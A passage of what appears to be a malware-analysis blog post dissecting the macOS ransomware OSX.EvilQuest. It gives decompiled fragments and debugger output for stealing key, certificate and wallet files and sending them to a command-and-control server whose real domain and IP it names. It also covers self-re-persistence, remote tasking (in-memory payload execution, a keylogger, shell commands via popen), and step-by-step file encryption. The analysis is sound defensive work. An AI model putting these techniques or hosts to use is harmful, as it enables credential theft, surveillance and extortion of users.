(0x10eb67b95): *.pfx/i
(0x10eb67bb5): *.p12/i
(0x10eb67bd5): *key*.pdf/i
(0x10eb67bf5): *wallet*.pdf/i
(0x10eb67c15): *key*.png/i
(0x10eb67c35): *wallet*.png/i
(0x10eb67c55): *key*.jpg/i
(0x10eb67c75): *wallet*.jpg/i
(0x10eb67c95): *key*.jpeg/i
(0x10eb67cb5): *wallet*.jpeg/i
</code></pre><p>Ah, so the malware has a propensity for sensitive files, such as certificates, crytocurrency wallets and keys!</p>
<p>Once the <code>get_targets</code> function returns (with a list of files that match these regexes) the malware reads each file&rsquo;s contents, (if they are under <code>0x1c00</code> bytes in length) via call to <code>lfsc_get_contents</code>, and then exfiltrates said contents to the attacker&rsquo;s remote command and control server (via <code>ei_forensic_sendfile</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>rax <span style="color:#f92672">=</span> _get_targets(rax, <span style="color:#f92672">&amp;</span>var_18, <span style="color:#f92672">&amp;</span>var_1C, _is_lfsc_target);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="color:#66d9ef">for</span> (var_8C <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; var_8C <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x0</span>; var_8C <span style="color:#f92672">=</span> var_8C <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#66d9ef">if</span> (fileSize <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x1c00</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>      ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>      rax <span style="color:#f92672">=</span> lfsc_get_contents(filePath, <span style="color:#f92672">&amp;</span>fileContents, <span style="color:#f92672">&amp;</span>fileSize);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>        <span style="color:#66d9ef">if</span> (ei_forensic_sendfile(fileContents, fileSize ...) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>            sleep();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>      }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>}</span></span></code></pre></div>
<p>We can confirm this in a debugger, but creating a file on desktop named, <code>key.png</code> and setting a breakpoint on the call to <code>lfsc_get_contents</code> (at <code>0x0000000100001965</code>). Once hit, we print out the contents of the first argument (<code>rdi</code>) and see indeed, the malware is attempting to read (and then exfiltrate) the <code>key.png</code> file:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ lldb /Library/mixednkey/toolroomd

...
(lldb) b 0x0000000100001965
Breakpoint 1: where = toolroomd`toolroomd[0x0000000100001965], address = 0x0000000100001965

(lldb) c

* thread #4, stop reason = breakpoint 1.1
->  0x10000171e: callq  lfsc_get_contents


(lldb) x/s $rdi
0x1001a99b0: "/Users/user/Desktop/key.png"

</pre>
</div>
<p>If infected, assume all your certs/wallets/keys are belong to attackers!</p>
<h3 id="persistence-monitoring">Persistence Monitoring</h3>
<p>Interestingly, the malware also appears to implement basic &ldquo;self-defense&rdquo;, and appears to re-persist itself if it&rsquo;s on-disk image is tampered with (deleted?).</p>
<p>In the <code>main</code> method, the malware spawns (another) background thread to execute a function named <code>ei_pers_thread</code>. This thread contains logic to (re)persist and (re)start the malware with calls to the functions such as <code>persist_executable</code>, <code>install_daemon</code>, and <code>run_daemon</code>. Interestingly enough, before these calls it invokes a function named <code>set_important_files</code> which opens a kernel queue (via <code>kqueue</code>) and instructs it to watch a file &hellip;specifically the malware&rsquo;s persistent binary: <code>~/Library/AppQuest/com.apple.questd</code>.</p>
<p>Another function, <code>extended_check_modification</code>, invokes the <code>kevent</code> API to detect modifications of the watched file.</p>
<div class="note">
For more on kqueues, see Apple's documentation on the topic:
<br>
<br>
<center>"<a href="https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/FSEvents_ProgGuide/KernelQueues/KernelQueues.html" class="inlineLink">Kernel Queues: An Alternative to File System Events</a>"</center>
</div>
<p>Via a file monitor, it appears that this mechanism can ensure that the malware is re-persisted if its on-disk binary image is deleted (as shown below):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# rm ~/Library/AppQuest/com.apple.questd
# ls ~/Library/AppQuest/com.apple.questd
ls: /Users/user/Library/AppQuest/com.apple.questd: No such file or directory

# fs_usage -w -f filesystem | grep com.apple.questd
...
WrData[A]       D=0x0069bff8  B=0x16000  /dev/disk1s1  /Users/user/Library/AppQuest/com.apple.questd toolroomd.66403

$ ls ~/Library/AppQuest/com.apple.questd
/Users/user/Library/AppQuest/com.apple.questd

</pre>
</div>
<h3 id="remote-tasking">Remote Tasking</h3>
<p>The malware also supports a small set of (powerful) commands, that afford a remote attacker complete and continuing access over an infected system.</p>
<p>From the <code>main</code> function, the malware invokes a function named <code>eiht_get_update</code>. This function attempts to read a remote file (<code>ret.txt</code>) from <code>andrewka6.pythonanywhere.com</code> that contained the address of the remote command and control server. If that failed, the malware would default to using the hard-coded (albeit encrypted) IP address <code>167.71.237.219</code>. In order to gather information about the infected host, it invokes a function named: <code>ei_get_host_info</code> &hellip;which in turn invokes various macOS APIs such as <code>getlogin</code> and <code>gethostname</code>.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) x/s 0x0000000100121cf0
0x100121cf0: "user[(null)]"
(lldb) x/s 0x00000001001204b0
0x1001204b0: "Darwin 18.6. (x86_64) US-ASCII yes-no"
</pre>
</div>
<p>This basic survey data is serialized (and encrypted?) before being sent to the attacker&rsquo;s command and control server (via the <code>http_request</code> function) encoded in the URL.</p>
<p>The response is deserialized (via a call to a function named <code>eicc_deserialize_request</code>), and then validated (via <code>eiht_check_command</code>). Interestedly it appears that some information (a checksum?) of the command may be logged to a file <code>.shcsh</code>, by means of a call to the <code>eiht_append_command</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>int eiht_append_command<span style="color:#f92672">(</span>int arg0, int arg1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    var_1C <span style="color:#f92672">=</span> _ei_tpyrc_checksum<span style="color:#f92672">(</span>arg0, arg1<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    var_28 <span style="color:#f92672">=</span> fopen<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;.shcsh&#34;</span>, <span style="color:#e6db74">&#34;ab&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    fseek<span style="color:#f92672">(</span>var_28, 0x0, 0x2<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    rax <span style="color:#f92672">=</span> fwrite<span style="color:#f92672">(</span>&amp;var_1C, 0x1, 0x4, var_28<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    var_30 <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    rax <span style="color:#f92672">=</span> fclose<span style="color:#f92672">(</span>var_28<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#f92672">}</span></span></span></code></pre></div>
<p>Any tasking received from the command and control server is handled via the <code>_dispatch</code> function (at address: <code>0x000000010000A7E0</code>), which is passed the result of the call to the <code>eicc_deserialize_request</code> function.</p>
<p>Interestingly the malware appears to first checks to make sure the received command is for the actual host - via a call to a function named <code>check_if_targeted</code>.
This function extracts values received from the server checking that:</p>
<ol start="0">
<li><code>deserializedRequest+0x10</code> matches <code>0x200</code> &hellip;if not, return ok.</li>
<li><code>deserializedRequest+0x10</code> matches <code>0BADA55FCh</code> &hellip;if not, return error (<code>0x0FFFFFFFE</code>)</li>
<li><code>deserializedRequest+0x14</code> matches the first byte of the infected system&rsquo;s mac address, (or that the first byte of the infected system&rsquo;s mac address is zero) &hellip;if not, return error (<code>0xFFFFFFFDh</code>)</li>
</ol>
<p>If the <code>check_if_targeted</code> function returns a non-zero value, and command from server is not processed.</p>
<p>The last of these &ldquo;prerequisites&rdquo; is rather interesting:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">//get_host_identifier return first byte of mac address (extended into 64bit register)
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e"></span>__text:<span style="color:#ae81ff">000000010000</span>A6A8                 call    _get_host_identifier
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>__text:<span style="color:#ae81ff">000000010000</span>A6AD                 mov     [rbp<span style="color:#f92672">+</span>hostID], rax
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>__text:<span style="color:#ae81ff">000000010000</span>A6B1                 mov     rax, [rbp<span style="color:#f92672">+</span>hostID]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>__text:<span style="color:#ae81ff">000000010000</span>A6B5                 cmp     rax, [rbp<span style="color:#f92672">+</span>copy2]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>__text:<span style="color:#ae81ff">000000010000</span>A6B9                 jz      <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>__text:<span style="color:#ae81ff">000000010000</span>A6BF                 cmp     [rbp<span style="color:#f92672">+</span>hostID], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>__text:<span style="color:#ae81ff">000000010000</span>A6C4                 jz      <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>__text:<span style="color:#ae81ff">000000010000</span>A6CA                 mov     [rbp<span style="color:#f92672">+</span>returnVar], <span style="color:#ae81ff">0FF</span>FFFFFDh
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>__text:<span style="color:#ae81ff">000000010000</span>A6D1                 jmp     leave</span></span></code></pre></div>
<p>This seems to imply that either:</p>
<ol>
<li>The attacker knows the first byte of the infected system&rsquo;s mac address (and thus can insert it in the packet from the server so the &ldquo;prerequisite&rdquo; can be fulfilled),
or</li>
<li>The attacker only wants commands to be processed on infected systems where the first byte is of the mac address is 0x0 (it is on my VM, but not my base system).</li>
</ol>
<p>Though further analysis is needed, it appears that only code that retrieves the infected system mac address, is via the <code>_get_host_identifier</code> function (which calls a function named <code>ei_get_macaddr</code>). This code is only invoked in the <code>check_if_targeted</code> function. That is to say, nowhere else is the mac address retrieved (for example we don&rsquo;t see it as part of the survey data that is then sent to the server on initial check in).</p>
<img src="../images/blog/blog_0x60/xrefs.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Assuming the server&rsquo;s response contains a <code>0x200</code> (at offset <code>0x10</code>) or the first byte of the mac address is <code>0x0</code> or matches the value in the packet from the server, tasking commences.</p>
<p>The malware supports the following tasking:</p>
<ul>
<li>
<p>Task <code>0x1</code>: <code>react_exec</code>
<br>
<br>
The <code>react_exec</code> command appears to execute a payload received from the server. Interestingly it attempts to first execute the payload directly from memory! Specifically it invokes a function named <code>ei_run_memory_hrd</code> which invokes the Apple <code>NSCreateObjectFileImageFromMemory</code>, <code>NSLinkModule</code>, <code>NSLookupSymbolInModule</code>, and <code>NSAddressOfSymbol</code> APIs to load and link the in-memory payload.
<br>
<br>
At a previous BlackHat talk (<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf">&ldquo;Writing Bad @$$ Malware for OS X&rdquo;</a>), I discussed this technique (an noted Apple used to host sample code to implement such in-memory execution):
<img src="../images/blog/blog_0x51/presentation.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<br>
If the in-memory execution fails, the malware writes out the payload to a file named <code>.xookc</code>, sets it to be executable (via <code>chmod</code>), then executes via a call to <code>system</code>.</p>
</li>
<li>
<p>Task <code>0x2</code>: <code>react_save</code>
<br>
<br>
The <code>react_save</code> decodes data received from the server and saves it to a file. It appears the file name is specified by the server as well. In some cases the file will be set to executable via a call to <code>chmod</code>.</p>
</li>
<li>
<p>Task <code>0x4</code>: <code>react_start</code>
<br>
<br>
This method is a nop, and does nothing:
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">react_start</span>(<span style="color:#66d9ef">int</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>}</span></span></code></pre></div></p>
</li>
<li>
<p>Task <code>0x8</code>: <code>react_keys</code>
<br>
<br>
The <code>react_keys</code> command starts a keylogger. Specifically it instructs the malware to spawn a background thread to execute a function named <code>eilf_rglk_watch_routine</code>. This function creates an event tap (via the <code>CGEventTapCreate</code> API), add it to the current runloop, then invokes the <code>CGEventTapEnable</code> to activate the event tap.
<br>
Once the tap is activated, keypresses (e.g. by the user) will be delivered to the <code>process_event</code> function, which then converts the the raw keypresses &ldquo;readable&rdquo; key codes (via the <code>kconvert</code> function). Somewhat interestingly, the malware then passes the converted key code to the <code>printf</code> function &hellip;to print them out? (You&rsquo;d have thunk it would write them to a file &hellip;). Perhaps this part of code is not quite done (yet)!</p>
</li>
<li>
<p>Task <code>0x10</code>: <code>react_ping</code>
<br>
<br>
The <code>react_ping</code> command simply compares a value from the server with the (now decrypted) string <code>&quot;Hi there&quot;</code>. A match causes this command to return &ldquo;success&rdquo;, which likely just causes the malware to respond to the server for (more) tasking.</p>
</li>
<li>
<p>Task <code>0x20</code>: <code>react_host</code>
<br>
<br>
This method is a nop, and does nothing:
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">react_host</span>(<span style="color:#66d9ef">int</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>}</span></span></code></pre></div></p>
</li>
<li>
<p>Task <code>0x40</code>: <code>react_scmd</code>
<br>
<br>
The <code>react_scmd</code> command will execute a command from the server via the <code>popen</code> API:
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>__text:<span style="color:#ae81ff">000000010000</span><span style="color:#ae81ff">9</span>EDD                 mov     rdi, [rbp<span style="color:#f92672">+</span>var_18] ; <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">000000010000</span><span style="color:#ae81ff">9</span>EE1                 lea     rsi, aR         ; <span style="color:#e6db74">&#34;r&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>__text:<span style="color:#ae81ff">000000010000</span><span style="color:#ae81ff">9</span>EE8                 mov     [rbp<span style="color:#f92672">+</span>var_70], rax
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>__text:<span style="color:#ae81ff">000000010000</span><span style="color:#ae81ff">9</span>EEC                 call    _popen</span></span></code></pre></div>
<br>
The response (output) of the command is read, and transmitted about to the server via the <code>eicc_serialize_request</code> and <code>http_request</code> functions.</p>
</li>
</ul>
<h3 id="file-ransom">File Ransom</h3>
<p>The most readily observable side-affect of an <code>OSX.EvilQuest</code> infection is its file encryption (ransomware) activities.</p>
<p>After the malware has invoked a method named <code>_s_is_high_time</code> and waited on several timers to expire, it begins encrypting the (unfortunate) user&rsquo;s files, by invoking a function named <code>carve_target</code>.
The <code>carve_target</code> first begins the key generation process via a call to the <code>random</code> API, and functions named <code>eip_seeds</code> and <code>eip_key</code>. It then generates a list of files to encrypt, by invoking the <code>get_targets</code> function, passing in the <code>is_file_target</code> as a filter function. This filter function filters out all files, except those that match certain file extensions. The encrypted list of extensions is hard-coded at address <code>000000010001299E</code> within the malware. In <a href="blog_0x59.html">part one</a> of this blog post series, we decrypted all the embedded string, thus can readily examine the decrypted list:</p>
<pre tabindex="0"><code>(0x10eb6999e): .tar
(0x10eb699b2): .rar
(0x10eb699c6): .tgz
(0x10eb699da): .zip
(0x10eb699ee): .7z
(0x10eb69a02): .dmg
(0x10eb69a16): .gz
(0x10eb69a2a): .jpg
(0x10eb69a3e): .jpeg
(0x10eb69a52): .png
(0x10eb69a66): .gif
(0x10eb69a7a): .psd
(0x10eb69a8e): .eps
(0x10eb69aa2): .mp4
(0x10eb69ab6): .mp3
(0x10eb69aca): .mov
(0x10eb69ade): .avi
(0x10eb69af2): .mkv
(0x10eb69b06): .wav
(0x10eb69b1a): .aif
(0x10eb69b2e): .aiff
(0x10eb69b42): .ogg
(0x10eb69b56): .flac
(0x10eb69b6a): .doc
(0x10eb69b7e): .txt
(0x10eb69b92): .docx
(0x10eb69ba6): .xls
(0x10eb69bba): .xlsx
(0x10eb69bce): .pages
(0x10eb69be2): .pdf
(0x10eb69bf6): .rtf
(0x10eb69c0a): .m4a
(0x10eb69c1e): .csv
(0x10eb69c32): .djvu
(0x10eb69c46): .epub
(0x10eb69c5a): .pub
(0x10eb69c6e): .key
(0x10eb69c82): .dwg
(0x10eb69c96): .c
(0x10eb69caa): .cpp
(0x10eb69cbe): .h
(0x10eb69cd2): .m
(0x10eb69ce6): .php
(0x10eb69cfa): .cgi
(0x10eb69d0e): .css
(0x10eb69d22): .scss
(0x10eb69d36): .sass
(0x10eb69d4a): .otf
(0x10eb69d5e): .ttf
(0x10eb69d72): .asc
(0x10eb69d86): .cs
(0x10eb69d9a): .vb
(0x10eb69dae): .asp
(0x10eb69dc2): .ppk
(0x10eb69dd6): .crt
(0x10eb69dea): .p7
(0x10eb69dfe): .pfx
(0x10eb69e12): .p12
(0x10eb69e26): .dat
(0x10eb69e3a): .hpp
(0x10eb69e4e): .ovpn
(0x10eb69e62): .download
(0x10eb69e82): .pem
(0x10eb69e96): .numbers
(0x10eb69eb6): .keynote
(0x10eb69ed6): .ppt
(0x10eb69eea): .aspx
(0x10eb69efe): .html
(0x10eb69f12): .xml
(0x10eb69f26): .json
(0x10eb69f3a): .js
(0x10eb69f4e): .sqlite
(0x10eb69f6e): .pptx
(0x10eb69f82): .pkg
</code></pre><p>Armed with a list of target files (that match the above extensions), the malware completes the key generation process (via a call to <code>random_key</code>, which in turn calls <code>srandom</code> and <code>random</code>), before calling a function named <code>carve_target</code> on each file.</p>
<p>The <code>carve_target</code> function is invoked with the path of the file to encrypt, the result of the call to <code>random_key</code>, as well as values from returned by the calls to <code>eip_seeds</code> and <code>eip_key</code>.
It takes the following actions:</p>
<ol>
<li>Makes sure the file is accessible via a call to <code>stat</code></li>
<li>Creates a temporary file name, via a call to a function named <code>make_temp_name</code></li>
<li>Opens the target file for reading</li>
<li>Checks if the target file is already encrypted via a call to a function named <code>is_carved</code> (which checks for the presence of <code>BEBABEDD</code> at the end of the file).</li>
<li>Open the temporary file for writing</li>
<li>Read(s) 0x4000 byte chunks from the target file</li>
<li>Invokes a function named <code>tpcrypt</code> to encrypt the (0x4000) bytes</li>
<li>Write out the encrypted bytes to the temporary file</li>
<li>Repeats steps 6-8 until all bytes have been read and encrypted from the target file</li>
<li>Invokes a function named <code>eip_encrypt</code> to encrypt (certain?) keying information which is then appended to the temporary file</li>
<li>Writes <code>0DDBEBABE</code> to end of the temporary file (as noted by <a href="https://twitter.com/dineshdina04/status/1277672052686614528">Dinesh Devadoss</a>)</li>
<li>Deletes the target file</li>
<li>Renames the temporary file to the target file</li>
</ol>
<p>Once all the files in the list of target files have been encrypted, the malware writes out the following to a file named <code>READ_ME_NOW.txt</code>:</p>
<img src="../images/blog/blog_0x59/readMe.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>To make sure the user reads this file, it displays the following modal prompt, and reads it aloud via macOS built-in &lsquo;say&rsquo; command:</p>
<img src="../images/blog/blog_0x59/instructions.png"  width="66%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Luckily <a href="https://objective-see.com/products/ransomwhere.html">RansomWhere?</a> detects this file ransoming üòá</p>
<img src="../images/blog/blog_0x59/ransomwhere.png"  width="50%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Hrmmm, but what about file decryption? Well as <a href="https://twitter.com/objective_see/status/1278227571969101824">noted</a> (by your truly) on twitter, though the malware contains a function named <code>uncarve_target</code> which appears to be able to decrypt (&ldquo;unransom&rdquo;) a file, give a path to the file and the decryption key, there are no cross-references to this function!</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">The &quot;uncarve_target&quot; function takes a file path &amp; decryption key to &quot;unransom&quot; a file.<br><br>But no xrefs means it&#39;s never invoked? So, maybe the malware can&#39;t/won&#39;t restore ransomed files ...even if you pay the ransom!? ü§î<br><br>(...of course disassembler might have just missed an xref) <a href="https://t.co/1IyRzB5CBq">pic.twitter.com/1IyRzB5CBq</a></p>&mdash; Objective-See (@objective_see) <a href="https://twitter.com/objective_see/status/1278227571969101824?ref_src=twsrc%5Etfw">July 1, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>Moreover, it does not appear that the dynamically generated encryption key is ever sent to the server (attacker).</p>
<p>This implies that even if you do pay, there is no way to decrypt the ransomed files? (unless there is enough keying material stored in the file, and a separate decryptor utility is created &hellip;but this seems unlikely). ü§î</p>
<h3 id="conclusion">Conclusion</h3>
<p>This wraps up our analysis of <code>OSX.EvilQuest</code>!
In <a href="blog_0x59.html">part one</a> of this blog post series, we detailed the infection vector, persistence, and anti-analysis logic of this new malware.</p>
<p>Today, we dove deeper, detailing the malware&rsquo;s viral infection capabilities, file exfiltration logic, persistence monitoring, remote tasking capabilities, and its ransomware logic.</p>
<p>End result? A rather comprehensive understanding of this rather insidious threat!</p>
<p>But good news, our (free!) tools such as <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> and <a href="https://objective-see.com/products/ransomwhere.html">RansomWhere?</a> were able to detect and thwart various aspects of the attack &hellip;with no priori knowledge!</p>
<img src="../images/blog/blog_0x59/blockblock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<img src="../images/blog/blog_0x59/ransomwhere.png"  width="50%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>IoCs:</p>
<ul>
<li><code>/Library/mixednkey/toolroomd</code></li>
<li><code>/Library/AppQuest/com.apple.questd</code></li>
<li><code>~/Library/AppQuest/com.apple.questd</code></li>
<li><code>/Library/LaunchDaemons/com.apple.questd.plist</code></li>
<li><code>~/Library/LaunchAgents/com.apple.questd.plist</code></li>
</ul>
<p>Note though if you are infected, due to the malware&rsquo;s viral infection capabilities, it is recommended that one wipes the infected system and fully reinstalls macOS.</p>
<br>
<div class="note">
<center>
‚ù§Ô∏è Love these blog posts and/or want to support my research and tools? 
<p>You can support them via my <a href="https://www.patreon.com/bePatron?c=701171">Patreon</a> page!</p>
